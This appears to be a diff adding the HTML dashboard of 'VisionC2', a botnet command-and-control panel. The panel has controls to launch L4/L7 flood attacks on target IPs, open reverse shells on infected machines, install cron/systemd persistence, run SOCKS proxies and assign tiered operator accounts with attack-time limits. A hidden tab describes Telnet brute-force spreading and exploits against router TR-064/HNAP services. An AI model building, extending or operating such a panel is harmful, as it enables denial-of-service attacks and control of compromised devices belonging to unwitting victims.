@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>VisionC2</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+
+<body>
+    <div class="header">
+        <div class="brand">&#9790;&#8483;&#9790; VisionC2 <span class="sse-indicator sse-disconnected" id="sse-dot"
+                title="Connecting..."></span></div>
+        <div class="nav">
+            <button class="theme-toggle" onclick="toggleTheme()" id="theme-toggle" data-tooltip="Toggle light / dark mode" class="tt-below">
+                <svg class="theme-icon sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="5" />
+                    <line x1="12" y1="1" x2="12" y2="3" />
+                    <line x1="12" y1="21" x2="12" y2="23" />
+                    <line x1="4.22" y1="4.22" x2="5.64" y2="5.64" />
+                    <line x1="18.36" y1="18.36" x2="19.78" y2="19.78" />
+                    <line x1="1" y1="12" x2="3" y2="12" />
+                    <line x1="21" y1="12" x2="23" y2="12" />
+                    <line x1="4.22" y1="19.78" x2="5.64" y2="18.36" />
+                    <line x1="18.36" y1="5.64" x2="19.78" y2="4.22" />
+                </svg>
+                <svg class="theme-icon moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z" />
+                </svg>
+            </button>
+            <select id="global-theme-picker" onchange="applyGlobalTheme(this.value)" title="Panel theme" style="background:var(--bg-card,#161b22);color:var(--text,#c9d1d9);border:1px solid var(--border,#30363d);border-radius:6px;padding:4px 8px;font-size:12px;cursor:pointer"></select>
+            <button class="help-btn" onclick="toggleHelp()" data-tooltip="Keyboard shortcuts" class="tt-below">?</button>
+            <button class="notif-toggle" onclick="toggleNotifs()" id="notif-btn" data-tooltip="Bot connect / disconnect history" class="tt-below">Notifications <span class="notif-badge"
+                    id="notif-badge" style="display:none">0</span></button>
+            <a href="/logout">Logout</a>
+        </div>
+    </div>
+
+    <div class="stats">
+        <div class="stat-card">
+            <div class="label">Bots Online <span class="stat-delta flat" id="s-bots-delta"></span></div>
+            <div class="value green" id="s-bots">-</div>
+            <svg class="sparkline spark-green" id="spark-bots" viewBox="0 0 120 32" preserveAspectRatio="none"></svg>
+            <div class="stat-sub" id="s-bots-range"></div>
+        </div>
+        <div class="stat-card">
+            <div class="label">Total RAM <span class="stat-delta flat" id="s-ram-delta"></span></div>
+            <div class="value" id="s-ram">-</div>
+            <svg class="sparkline spark-blue" id="spark-ram" viewBox="0 0 120 32" preserveAspectRatio="none"></svg>
+        </div>
+        <div class="stat-card">
+            <div class="label">Total CPU <span class="stat-delta flat" id="s-cpu-delta"></span></div>
+            <div class="value" id="s-cpu">-</div>
+            <svg class="sparkline spark-purple" id="spark-cpu" viewBox="0 0 120 32" preserveAspectRatio="none"></svg>
+        </div>
+        <div class="stat-card">
+            <div class="label">C2 Uptime</div>
+            <div class="value purple" id="s-uptime">-</div>
+            <div class="stat-sub">session active</div>
+        </div>
+        <div class="stat-card">
+            <div class="label">Architectures</div>
+            <div class="arch-pills" id="s-arch"></div>
+        </div>
+        <div class="stat-card" id="s-groups-card" style="display:none">
+            <div class="label">Groups</div>
+            <div class="arch-pills" id="s-groups"></div>
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Command Center -->
+        <div class="cmd-panel" id="cmd-bar">
+            <div class="cmd-panel-header">
+                <span class="cmd-panel-title" onclick="toggleCmdBar()">Command Center</span>
+                <div class="cmd-cat-btns" id="cmd-cat-btns">
+                    <button class="cmd-cat active" data-cat="exec" onclick="switchCmdCat(this)">Exec</button>
+                    <button class="cmd-cat" data-cat="network" onclick="switchCmdCat(this)">Network</button>
+                    <button class="cmd-cat" data-cat="mgmt" onclick="switchCmdCat(this)">Mgmt</button>
+                </div>
+            </div>
+            <div class="cmd-panel-body" id="cmd-inline">
+                <select id="cmd-type" onchange="updateArgFields()">
+                    <option value="!shell" data-cat="exec">!shell</option>
+                    <option value="!detach" data-cat="exec">!detach</option>
+                    <option value="!socks" data-cat="network">!socks</option>
+                    <option value="!stopsocks" data-cat="network">!stopsocks</option>
+                    <option value="!socksauth" data-cat="network">!socksauth</option>
+                    <option value="!persist" data-cat="mgmt">!persist</option>
+                    <option value="!reinstall" data-cat="mgmt">!reinstall</option>
+                    <option value="!lolnogtfo" data-cat="mgmt">!kill</option>
+                </select>
+                <div id="arg-fields" class="cmd-args"></div>
+                <div class="cmd-target-wrap">
+                    <input type="text" id="cmd-bot" placeholder="target: all bots  (enter bot ID to target)" class="cmd-target" autocomplete="off"
+                        title="Leave blank to broadcast to all bots, or enter a Bot ID / group name to single-target">
+                    <button class="cmd-target-clear" id="cmd-target-clear" onclick="clearCmdTarget()"
+                        title="Clear target" style="display:none">&times;</button>
+                </div>
+                <button class="cmd-btn cmd-send" onclick="sendCmd()" data-tooltip="Send command to target (or all bots if no target set)">Send</button>
+            </div>
+        </div>
+
+        <!-- Tab bar -->
+        <div class="tab-bar">
+            <button class="tab active" data-tab="tab-bots" onclick="switchTab(this)" data-tooltip="All connected bots and their stats">Bots <span class="tab-count"
+                    id="tab-bots-count">0</span></button>
+            <button class="tab" data-tab="tab-socks" onclick="switchTab(this);loadRelayStats()" data-tooltip="Active SOCKS5 proxies and relay health">SOCKS <span class="tab-count"
+                    id="tab-socks-count">0</span></button>
+            <button class="tab" data-tab="tab-attack" onclick="switchTab(this)" data-tooltip="Launch L4/L7 flood attacks against a target">Attack</button>
+            <button class="tab" data-tab="tab-activity" onclick="switchTab(this)" data-tooltip="Real-time event log — connections, disconnects, commands">Activity</button>
+            <button class="tab" data-tab="tab-tasks" onclick="switchTab(this);loadTasks()" data-tooltip="Scheduled recurring commands sent on a cron interval">Tasks <span class="tab-count"
+                    id="tab-tasks-count">0</span></button>
+            <button class="tab" data-tab="tab-users" onclick="switchTab(this);loadUsers()" data-tooltip="Manage operator accounts and permission levels">Users</button>
+        </div>
+
+        <!-- Tab: Bots -->
+        <div class="tab-panel active" id="tab-bots">
+            <div class="search-bar">
+                <input type="text" id="bot-search"
+                    placeholder="Filter bots by ID, IP, country, arch... (press / to focus)" oninput="filterBotTable()"
+                    autocomplete="off" spellcheck="false">
+                <span class="search-count" id="search-count"></span>
+                <button class="compact-toggle" onclick="refreshAll()" title="Refresh bots &amp; stats">&#8635;</button>
+                <button class="compact-toggle" id="compact-toggle" onclick="toggleCompactMode()"
+                    title="Toggle compact mode">Compact</button>
+            </div>
+            <!-- Filter panel -->
+            <div class="filter-panel" id="filter-panel">
+                <div class="filter-header">
+                    <span class="filter-title">Filters</span>
+                    <button class="filter-clear-btn" onclick="clearAllFilters()">Clear All</button>
+                </div>
+                <div class="filter-groups" id="filter-groups"></div>
+            </div>
+            <!-- Multi-select action bar -->
+            <div class="multi-select-bar" id="multi-select-bar" style="display:none">
+                <div class="ms-info"><input type="checkbox" id="ms-select-all"
+                        onchange="toggleSelectAll(this.checked)"><span id="ms-count">0 selected</span></div>
+                <div class="ms-actions">
+                    <button class="ms-btn ms-btn-group" onclick="msSetGroup()" data-tooltip="Tag selected bots with a group name for batch targeting">Set Group</button>
+                    <button class="ms-btn" onclick="msOpenShells()" data-tooltip="Open an interactive reverse shell for each selected bot">Open Shells</button>
+                    <button class="ms-btn" onclick="msCmdFiltered('!socks', 'socksEnabled')" data-tooltip="Start a SOCKS5 proxy on each selected bot (skips bots without SOCKS module)">Start SOCKS</button>
+                    <button class="ms-btn" onclick="msCmd('!persist')" data-tooltip="Install cron + rc.local + systemd persistence on selected bots">Persist</button>
+                    <button class="ms-btn ms-btn-danger" onclick="msKill()" data-tooltip="Wipe all persistence, delete binary, and terminate — irreversible">Kill</button>
+                </div>
+            </div>
+            <div id="bot-table-wrap" class="bot-table-virtual">
+                <table>
+                    <thead>
+                        <tr>
+                            <th style="width:32px"><input type="checkbox" id="th-select-all"
+                                    onchange="toggleSelectAll(this.checked)"></th>
+                            <th class="sortable" onclick="sortBots('botID')" title="Unique bot identifier derived from hardware fingerprint">Bot ID <span class="sort-arrow"
+                                    id="sort-botID"></span></th>
+                            <th class="sortable" onclick="sortBots('ip')" title="Bot's external IP address">IP <span class="sort-arrow"
+                                    id="sort-ip"></span></th>
+                            <th class="sortable" onclick="sortBots('country')" title="GeoIP country">Country <span class="sort-arrow"
+                                    id="sort-country"></span></th>
+                            <th class="sortable" onclick="sortBots('group')" title="Operator-assigned group tag — use for batch command targeting">Group <span class="sort-arrow"
+                                    id="sort-group"></span></th>
+                            <th class="sortable" onclick="sortBots('arch')" title="CPU architecture (amd64, arm64, mips, mipsle, …)">Arch <span class="sort-arrow"
+                                    id="sort-arch"></span></th>
+                            <th class="sortable" onclick="sortBots('ram')" title="Total system RAM">RAM <span class="sort-arrow"
+                                    id="sort-ram"></span></th>
+                            <th class="sortable" onclick="sortBots('cpuCores')" title="Number of logical CPU cores">CPU <span class="sort-arrow"
+                                    id="sort-cpuCores"></span></th>
+                            <th class="sortable" onclick="sortBots('uplinkMbps')" title="Estimated outbound bandwidth — useful for picking flood sources">Uplink <span class="sort-arrow"
+                                    id="sort-uplinkMbps"></span></th>
+                            <th class="sortable" onclick="sortBots('processName')" title="Camouflage process name the bot is masquerading as in the process table">Process <span class="sort-arrow"
+                                    id="sort-processName"></span></th>
+                            <th title="Modules compiled into this bot: ATK=attacks, SOCKS=proxy">Caps</th>
+                            <th class="sortable" onclick="sortBots('socksActive')" title="Whether a SOCKS5 proxy is currently running on this bot">SOCKS <span class="sort-arrow"
+                                    id="sort-socksActive"></span></th>
+                            <th title="How long this bot has been connected in the current session">Uptime</th>
+                            <th title="Time since last heartbeat — goes red when stale (bot likely dead)">Last Ping</th>
+                        </tr>
+                    </thead>
+                    <tbody id="bot-tbody"></tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Tab: SOCKS -->
+        <div class="tab-panel" id="tab-socks">
+            <div class="socks-stat">
+                <div>
+                    <div class="ss-label">Active</div>
+                    <div class="ss-val" id="socks-active">0</div>
+                </div>
+                <div>
+                    <div class="ss-label">Total Bots</div>
+                    <div class="ss-val" style="color:var(--blue)" id="socks-total">0</div>
+                </div>
+            </div>
+            <div id="socks-relay-health" style="margin-bottom:16px"></div>
+            <div id="socks-dash-wrap">
+                <div class="no-bots">No active SOCKS proxies</div>
+            </div>
+        </div>
+
+        <!-- Tab: Attack -->
+        <div class="tab-panel" id="tab-attack">
+            <!-- Attack Builder Wizard -->
+            <div class="wizard-container" id="attack-wizard">
+                <div class="wizard-header">
+                    <h3>Attack Builder</h3>
+                    <div class="wizard-steps">
+                        <div class="wizard-step active" data-step="1"><span class="step-num">1</span> Method</div>
+                        <div class="wizard-step" data-step="2"><span class="step-num">2</span> Target</div>
+                        <div class="wizard-step" data-step="3"><span class="step-num">3</span> Review</div>
+                    </div>
+                </div>
+                <div class="wizard-body">
+                    <div class="wizard-page active" id="wiz-step-1">
+                        <div class="method-grid" id="wiz-method-grid"></div>
+                    </div>
+                    <div class="wizard-page" id="wiz-step-2">
+                        <div class="wiz-form-row"><label>Target IP</label><input type="text" id="wiz-target" placeholder="1.2.3.4" autocomplete="off"></div>
+                        <div class="wiz-form-row"><label>Port</label><input type="text" id="wiz-port" placeholder="80" value="80" autocomplete="off"></div>
+                        <div class="wiz-form-row"><label>Duration (seconds)</label>
+                            <input type="range" id="wiz-duration-slider" min="30" max="3600" value="120" oninput="document.getElementById('wiz-duration-val').value=this.value">
+                            <input type="number" id="wiz-duration-val" value="120" min="30" max="3600" oninput="document.getElementById('wiz-duration-slider').value=this.value">
+                        </div>
+                        <div class="wiz-form-row"><label>Bot Target (empty = all)</label><input type="text" id="wiz-bot-target" placeholder="all bots" autocomplete="off"></div>
+                    </div>
+                    <div class="wizard-page" id="wiz-step-3"><div class="wiz-review" id="wiz-review"></div></div>
+                </div>
+                <div class="wizard-footer">
+                    <button class="btn btn-secondary" id="wiz-back" onclick="wizardBack()" style="display:none">Back</button>
+                    <span style="flex:1"></span>
+                    <button class="btn btn-primary" id="wiz-next" onclick="wizardNext()">Next</button>
+                    <button class="btn btn-danger" id="wiz-launch" onclick="wizardLaunch()" style="display:none">Launch Attack</button>
+                </div>
+            </div>
+            <div class="atk-panel">
+                <div class="atk-row">
+                    <div class="atk-group" title="Attack method/vector to use">
+                        <label>Method</label>
+                        <select id="atk-method" onchange="updateAtkMethodInfo()">
+                            <optgroup label="HTTP / L7" id="atk-l7-group"></optgroup>
+                            <optgroup label="TCP" id="atk-tcp-group"></optgroup>
+                            <optgroup label="UDP" id="atk-udp-group"></optgroup>
+                            <optgroup label="Layer 3" id="atk-l3-group"></optgroup>
+                        </select>
+                    </div>
+                    <div class="atk-group" title="Target IP address or CIDR subnet (e.g. 1.2.3.0/24)">
+                        <label>Target IP</label>
+                        <input type="text" id="atk-target" placeholder="1.2.3.4" autocomplete="off" spellcheck="false">
+                    </div>
+                    <div class="atk-group" title="Destination port on the target (default: 80)">
+                        <label>Port</label>
+                        <input type="text" id="atk-port" placeholder="80" style="width:80px" autocomplete="off">
+                    </div>
+                    <div class="atk-group"
+                        title="Attack duration in seconds (default: 30). Limited by your account's max time">
+                        <label>Duration (s)</label>
+                        <input type="text" id="atk-duration" placeholder="30" style="width:80px" autocomplete="off">
+                    </div>
+                    <div class="atk-group" title="Target a specific bot by ID, or leave empty to send to all bots">
+                        <label>Bot Target</label>
+                        <input type="text" id="atk-bot" placeholder="empty = all bots" autocomplete="off">
+                    </div>
+                    <button class="atk-fire-btn" onclick="fireAttack()" title="Launch the attack">FIRE</button>
+                    <button class="atk-stop-btn" onclick="stopAttack()" title="Stop all running attacks">STOP
+                        ALL</button>
+                </div>
+                <div class="atk-desc" id="atk-desc"></div>
+                <div class="atk-advanced-toggle" onclick="toggleAtkAdvanced()">Advanced Options</div>
+                <div class="atk-advanced" id="atk-advanced" style="display:none">
+                    <div class="atk-opts" id="atk-opts"></div>
+                </div>
+            </div>
+
+            <!-- Live Attacks -->
+            <div class="live-attacks-panel" id="live-attacks-panel">
+                <div class="live-attacks-header">
+                    <span class="live-attacks-title">Live Attacks</span>
+                    <span class="live-attacks-count" id="live-attacks-count">0</span>
+                </div>
+                <div class="live-attacks-list" id="live-attacks-list">
+                    <div style="color:var(--text-dim);padding:12px;font-size:13px">No active attacks</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Tab: Activity -->
+        <div class="tab-panel" id="tab-activity">
+            <div class="activity-controls">
+                <input type="text" id="activity-search" placeholder="Search activity..." oninput="filterActivity()"
+                    autocomplete="off" spellcheck="false" class="activity-search-input">
+                <div class="activity-filters" id="activity-filters">
+                    <label class="activity-filter-chip active" data-type="all"
+                        onclick="toggleActivityFilter(this)">All</label>
+                    <label class="activity-filter-chip" data-type="connect" onclick="toggleActivityFilter(this)"><span
+                            class="afc-dot" style="background:var(--green)"></span>Connect</label>
+                    <label class="activity-filter-chip" data-type="disconnect"
+                        onclick="toggleActivityFilter(this)"><span class="afc-dot"
+                            style="background:var(--red)"></span>Disconnect</label>
+                    <label class="activity-filter-chip" data-type="command" onclick="toggleActivityFilter(this)"><span
+                            class="afc-dot" style="background:var(--blue)"></span>Command</label>
+                    <label class="activity-filter-chip" data-type="socks" onclick="toggleActivityFilter(this)"><span
+                            class="afc-dot" style="background:var(--accent)"></span>SOCKS</label>
+                    <label class="activity-filter-chip" data-type="error" onclick="toggleActivityFilter(this)"><span
+                            class="afc-dot" style="background:var(--yellow)"></span>Error</label>
+                </div>
+                <div class="activity-meta">
+                    <span class="activity-count" id="activity-count"></span>
+                    <button class="activity-clear-btn" onclick="clearActivity()">Clear</button>
+                </div>
+            </div>
+            <div class="activity-list" id="activity-list">
+                <div class="no-bots">No activity yet</div>
+            </div>
+        </div>
+
+        <!-- Tab: Tasks -->
+        <div class="tab-panel" id="tab-tasks">
+            <!-- Task Creator -->
+            <div class="task-creator">
+                <div class="task-creator-header">
+                    <h3>Create Task</h3>
+                    <span class="task-hint">Auto-executes on every bot connect</span>
+                </div>
+                <div class="task-creator-body">
+                    <div class="task-row">
+                        <div class="task-field" style="flex:0 0 auto">
+                            <label>Command</label>
+                            <select id="task-type" onchange="updateTaskArgFields()">
+                                <option value="!shell">!shell</option>
+                                <option value="!detach">!detach</option>
+                                <option value="!socks">!socks</option>
+                                <option value="!stopsocks">!stopsocks</option>
+                                <option value="!socksauth">!socksauth</option>
+                                <option value="!persist">!persist</option>
+                                <option value="!lolnogtfo">!kill</option>
+                            </select>
+                        </div>
+                        <div class="task-field" style="flex:1;min-width:0">
+                            <label>Arguments</label>
+                            <div id="task-arg-fields" class="task-args-inline"></div>
+                        </div>
+                    </div>
+                    <div class="task-row">
+                        <div class="task-field">
+                            <label>TTL (seconds)</label>
+                            <input type="number" id="task-duration" value="0" min="0" placeholder="0 = never expires">
+                        </div>
+                        <div class="task-field" style="flex:0 0 auto;align-self:flex-end">
+                            <label class="task-checkbox">
+                                <input type="checkbox" id="task-runonce">
+                                <span>Run Once</span>
+                            </label>
+                        </div>
+                        <div class="task-field" style="flex:0 0 auto;align-self:flex-end">
+                            <button class="task-submit" onclick="addTask()">Create Task</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- Active Tasks -->
+            <div class="task-list-section">
+                <div class="task-list-header">
+                    <h3>Active Tasks</h3>
+                    <span class="task-count" id="task-active-count">0</span>
+                </div>
+                <div id="task-table-wrap">
+                    <div class="task-empty">No active tasks</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Tab: Users -->
+        <div class="tab-panel" id="tab-users">
+            <div class="users-toolbar">
+                <button class="users-add-btn" onclick="showAddUserForm()">+ Add User</button>
+            </div>
+            <div class="users-form-wrap" id="users-form-wrap" style="display:none">
+                <div class="users-form">
+                    <h3 id="user-form-title">Add User</h3>
+                    <input type="hidden" id="uf-editing">
+                    <div class="uf-row">
+                        <label>Username</label>
+                        <input type="text" id="uf-username" placeholder="username" autocomplete="off">
+                    </div>
+                    <div class="uf-row">
+                        <label>Password</label>
+                        <input type="text" id="uf-password" placeholder="password" autocomplete="off">
+                    </div>
+                    <div class="uf-row">
+                        <label>Level</label>
+                        <select id="uf-level">
+                            <option value="Owner">Owner</option>
+                            <option value="Admin">Admin</option>
+                            <option value="Pro">Pro</option>
+                            <option value="Basic" selected>Basic</option>
+                        </select>
+                    </div>
+                    <div class="uf-row">
+                        <label>Expires</label>
+                        <input type="date" id="uf-expire">
+                    </div>
+                    <div class="uf-row">
+                        <label>Max Time (s)</label>
+                        <input type="number" id="uf-maxtime" value="300" min="1">
+                    </div>
+                    <div class="uf-row">
+                        <label>Concurrents</label>
+                        <input type="number" id="uf-concurrents" value="1" min="1">
+                    </div>
+                    <div class="uf-row">
+                        <label>Max Bots (0=all)</label>
+                        <input type="number" id="uf-maxbots" value="0" min="0">
+                    </div>
+                    <div class="uf-row">
+                        <label>Methods (comma-separated)</label>
+                        <input type="text" id="uf-methods" placeholder="udpplain,syn,ack" autocomplete="off">
+                    </div>
+                    <div class="uf-actions">
+                        <button class="uf-save" onclick="saveUser()">Save</button>
+                        <button class="uf-cancel" onclick="hideUserForm()">Cancel</button>
+                    </div>
+                </div>
+            </div>
+            <div class="users-grid" id="users-grid">
+                <div class="no-bots">Loading users...</div>
+            </div>
+        </div>
+
+        <!-- Tab: Scanners (removed — not in VisionC2) -->
+        <div class="tab-panel" id="tab-scanners" style="display:none!important">
+            <div class="users-toolbar" style="margin-bottom:12px">
+                <span style="color:var(--text-dim);font-size:13px">Start or stop scanners across all bots. Telnet
+                    scanner requires a scan server address.</span>
+            </div>
+            <div class="scanner-grid">
+                <!-- Telnet Scanner -->
+                <div class="scanner-card">
+                    <div class="scanner-card-header">
+                        <span class="scanner-card-title">Telnet Scanner</span>
+                        <span class="scanner-card-desc">Brute-force Telnet credentials and spread to new devices</span>
+                    </div>
+                    <div class="scanner-card-body">
+                        <div class="cmd-group" style="margin-bottom:10px">
+                            <label>Scan Server</label>
+                            <input type="text" id="scan-telnet-addr" placeholder="host:port (e.g. 1.2.3.4:48290)"
+                                class="cmd-target" style="width:100%">
+                        </div>
+                        <div class="scanner-card-actions">
+                            <button class="ms-btn" onclick="scannerStart('telnet')">Start All</button>
+                            <button class="ms-btn ms-btn-danger" onclick="scannerStop('telnet')">Stop All</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- TR-064 Scanner -->
+                <div class="scanner-card">
+                    <div class="scanner-card-header">
+                        <span class="scanner-card-title">TR-064 Scanner</span>
+                        <span class="scanner-card-desc">Exploit TR-064 (CPE WAN Management) on vulnerable routers</span>
+                    </div>
+                    <div class="scanner-card-body">
+                        <div class="scanner-card-actions">
+                            <button class="ms-btn" onclick="scannerStart('tr064')">Start All</button>
+                            <button class="ms-btn ms-btn-danger" onclick="scannerStop('tr064')">Stop All</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- HNAP Scanner -->
+                <div class="scanner-card">
+                    <div class="scanner-card-header">
+                        <span class="scanner-card-title">HNAP Scanner</span>
+                        <span class="scanner-card-desc">Exploit HNAP (Home Network Administration Protocol) on
+                            vulnerable routers</span>
+                    </div>
+                    <div class="scanner-card-body">
+                        <div class="scanner-card-actions">
+                            <button class="ms-btn" onclick="scannerStart('hnap')">Start All</button>
+                            <button class="ms-btn ms-btn-danger" onclick="scannerStop('hnap')">Stop All</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Notification drawer -->
+    <div class="notif-drawer" id="notif-drawer">
+        <div class="notif-header">
+            <h3>Notifications</h3>
+            <button class="notif-close" onclick="toggleNotifs()">&times;</button>
+        </div>
+        <div class="notif-list" id="notif-list">
+            <div class="notif-empty">No notifications yet</div>
+        </div>
+    </div>
+
+    <!-- Bot info popup -->
+    <div class="bot-info-popup" id="bot-popup">
+        <button class="popup-close" onclick="closeBotPopup()">&times;</button>
+        <div class="popup-header">
+            <span class="popup-id" id="popup-botid"></span>
+            <span class="popup-country" id="popup-country"></span>
+        </div>
+        <div class="popup-body">
+            <div class="popup-row"><span class="popup-label">IP Address</span><span class="popup-val"
+                    id="popup-ip"></span></div>
+            <div class="popup-row"><span class="popup-label">Architecture</span><span class="popup-val"
+                    id="popup-arch"></span></div>
+            <div class="popup-row"><span class="popup-label">RAM</span><span class="popup-val" id="popup-ram"></span>
+            </div>
+            <div class="popup-row"><span class="popup-label">CPU Cores</span><span class="popup-val"
+                    id="popup-cpu"></span></div>
+            <div class="popup-row"><span class="popup-label">Uplink</span><span class="popup-val"
+                    id="popup-uplink"></span></div>
+            <div class="popup-row"><span class="popup-label">Process</span><span class="popup-val"
+                    id="popup-proc"></span></div>
+            <div class="popup-row"><span class="popup-label">Uptime</span><span class="popup-val"
+                    id="popup-uptime"></span></div>
+            <div class="popup-row"><span class="popup-label">Last Ping</span><span class="popup-val"
+                    id="popup-ping"></span></div>
+            <div class="popup-section">
+                <div class="popup-section-title">SOCKS Proxy</div>
+                <div class="popup-row"><span class="popup-label">Status</span><span class="popup-val"
+                        id="popup-socks-status"></span></div>
+                <div class="popup-row" id="popup-socks-relay-row" style="display:none"><span
+                        class="popup-label">Port</span><span class="popup-val" id="popup-socks-relay"></span></div>
+                <div class="popup-row" id="popup-socks-auth-row" style="display:none"><span class="popup-label">Auth
+                        User</span><span class="popup-val" id="popup-socks-user"></span></div>
+                <div class="popup-row" id="popup-socks-since-row" style="display:none"><span class="popup-label">Running
+                        Since</span><span class="popup-val" id="popup-socks-since"></span></div>
+            </div>
+        </div>
+        <div class="popup-actions" id="popup-actions"></div>
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <!-- File context menu (right-click in file browser) -->
+    <div id="file-ctx-menu" style="display:none;position:fixed;z-index:9999;background:var(--bg-card);border:1px solid var(--border);border-radius:8px;box-shadow:0 8px 32px rgba(0,0,0,.5);padding:4px 0;min-width:160px;font-size:12px;">
+        <div class="ctx-item" id="ctx-copy-item" onclick="ctxCopyPath()">&#128203; Copy Path</div>
+        <div class="ctx-item" id="ctx-cd-item" onclick="ctxCd()">&#128193; Open / cd</div>
+        <div class="ctx-item" id="ctx-cat-item" onclick="ctxCat()">&#128196; View (cat)</div>
+        <div class="ctx-item" id="ctx-dl-item" onclick="ctxDownload()">&#11015; Download</div>
+        <div class="ctx-item" id="ctx-chmod-item" onclick="ctxChmod()">&#9881; chmod +x</div>
+        <div class="ctx-item" id="ctx-rename-item" onclick="ctxRename()">&#9998; Rename</div>
+        <div class="ctx-item ctx-item-danger" id="ctx-del-item" onclick="ctxDelete()">&#128465; Delete</div>
+    </div>
+
+    <!-- Shell modal (enhanced with sidebar + file browser) -->
+    <div class="shell-overlay" id="shell-overlay" onclick="if(event.target===this)closeShell()">
+        <div class="shell-modal">
+            <div class="shell-header">
+                <div style="display:flex;flex-direction:column;gap:4px">
+                    <span class="title" id="shell-title">Shell</span>
+                    <div class="meta" id="shell-meta"></div>
+                </div>
+                <div style="display:flex;gap:6px;align-items:center">
+                    <!-- Shell tab bar for multi-shell -->
+                    <div class="shell-tabs" id="shell-tabs"></div>
+                    <button class="close-btn" onclick="closeShell()">&times;</button>
+                </div>
+            </div>
+            <!-- Navigation bar: breadcrumb + quick nav -->
+            <div class="shell-nav">
+                <div class="shell-breadcrumb" id="shell-breadcrumb"></div>
+                <div class="shell-quicknav">
+                    <button class="qnav-btn" onclick="shellCd('/')" title="Root">/</button>
+                    <button class="qnav-btn" onclick="shellCd('~')" title="Home">~</button>
+                    <button class="qnav-btn" onclick="shellCd('..')" title="Parent">..</button>
+                    <button class="qnav-btn" onclick="shellCd('/tmp')" title="Temp">/tmp</button>
+                </div>
+            </div>
+            <div class="shell-body">
+                <!-- File browser sidebar -->
+                <div class="shell-sidebar" id="shell-sidebar">
+                    <div class="sidebar-header">
+                        <span>Files</span>
+                        <button class="sidebar-refresh" onclick="refreshFiles()" title="Refresh">&#8635;</button>
+                    </div>
+                    <div class="file-list" id="file-list">
+                        <div class="file-empty">Send a command to populate</div>
+                    </div>
+                </div>
+                <!-- Terminal area -->
+                <div class="shell-terminal">
+                    <div class="shell-output" id="shell-output"></div>
+                    <div class="shell-input-row">
+                        <span class="prompt" id="shell-prompt">~$</span>
+                        <input type="text" id="shell-input" placeholder="Type a command... (Tab for autocomplete)"
+                            autocomplete="off" spellcheck="false">
+                        <!-- Tab completion popup -->
+                        <div class="tab-complete" id="tab-complete" style="display:none"></div>
+                    </div>
+                </div>
+                <!-- Bot info sidebar -->
+                <div class="shell-info-sidebar" id="shell-info-sidebar">
+                    <div class="sidebar-header"><span>Bot Info</span></div>
+                    <div class="info-sidebar-body" id="info-sidebar-body"></div>
+                </div>
+            </div>
+            <div class="shell-actions">
+                <button class="shell-action-btn" onclick="saveShellHistory()"
+                    title="Download shell history">Save</button>
+                <button class="shell-action-btn" onclick="copyShellOutput()" title="Copy output to clipboard">Copy
+                    Output</button>
+                <button class="shell-action-btn" onclick="shellNetScan()" title="Quick network recon from bot">Net
+                    Scan</button>
+                <div class="shell-toolkit-wrap" id="shell-toolkit-wrap">
+                    <button class="shell-action-btn" onclick="toggleToolkit()" title="100+ red-team helpers">Toolkit &#9662;</button>
+                    <div class="shell-toolkit-menu" id="shell-toolkit-menu">
+                        <div class="toolkit-search-row">
+                            <input id="toolkit-search" class="toolkit-search-input" placeholder="Search commands..."
+                                oninput="buildToolkitMenu()" autocomplete="off">
+                        </div>
+                        <div id="toolkit-grid-body"></div>
+                    </div>
+                </div>
+                <select id="shell-theme-picker" class="shell-theme-select" onchange="applyShellTheme(this.value)" title="Terminal theme"></select>
+                <button class="shell-action-btn" onclick="shellZoom(+1)" title="Zoom in (Ctrl+=)">A+</button>
+                <button class="shell-action-btn" onclick="shellZoom(-1)" title="Zoom out (Ctrl+-)">A-</button>
+                <button class="shell-action-btn" onclick="shellUploadFile()" title="Upload file to bot cwd">Upload</button>
+                <input type="file" id="shell-upload-input" style="display:none" onchange="shellHandleUpload(this)">
+                <button class="shell-action-btn" style="color:var(--accent);border-color:var(--accent)"
+                    onclick="shellStartSocks()" title="Start SOCKS proxy">SOCKS</button>
+                <button class="shell-action-btn shell-action-danger" onclick="clearShellHistory()"
+                    title="Clear output">Clear</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Keyboard shortcuts help -->
+    <div class="help-overlay" id="help-overlay" onclick="if(event.target===this)toggleHelp()">
+        <div class="help-modal">
+            <div class="help-header">
+                <span class="help-title">Keyboard Shortcuts</span>
+                <button class="help-close" onclick="toggleHelp()">&times;</button>
+            </div>
+            <div class="help-body">
+                <div class="help-section">
+                    <div class="help-section-title">Navigation</div>
+                    <div class="help-row"><kbd>1</kbd><span>Bots tab</span></div>
+                    <div class="help-row"><kbd>2</kbd><span>SOCKS tab</span></div>
+                    <div class="help-row"><kbd>3</kbd><span>Attack tab</span></div>
+                    <div class="help-row"><kbd>4</kbd><span>Activity tab</span></div>
+                    <div class="help-row"><kbd>5</kbd><span>Tasks tab</span></div>
+                    <div class="help-row"><kbd>6</kbd><span>Users tab</span></div>
+                    <div class="help-row"><kbd>/</kbd> or <kbd>s</kbd><span>Focus search</span></div>
+                    <div class="help-row"><kbd>?</kbd><span>Toggle this help</span></div>
+                </div>
+                <div class="help-section">
+                    <div class="help-section-title">Bot Table</div>
+                    <div class="help-row"><span class="help-action">Right-click row</span><span>Bot info popup</span>
+                    </div>
+                    <div class="help-row"><span class="help-action">Double-click row</span><span>Open shell</span></div>
+                    <div class="help-row"><span class="help-action">Click column header</span><span>Sort by
+                            column</span></div>
